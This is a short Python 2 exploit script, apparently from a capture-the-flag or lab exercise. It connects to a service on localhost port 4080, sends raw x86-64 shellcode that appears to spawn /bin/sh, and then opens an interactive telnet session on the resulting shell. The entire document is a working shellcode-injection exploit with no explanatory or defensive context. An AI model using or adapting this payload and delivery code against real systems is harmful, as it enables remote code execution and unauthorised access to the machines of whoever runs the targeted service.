import socket
import telnetlib

shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost",4080))
print s.recv(1024)
s.sendall(shellcode)
t = telnetlib.Telnet()
t.sock = s
t.interact()
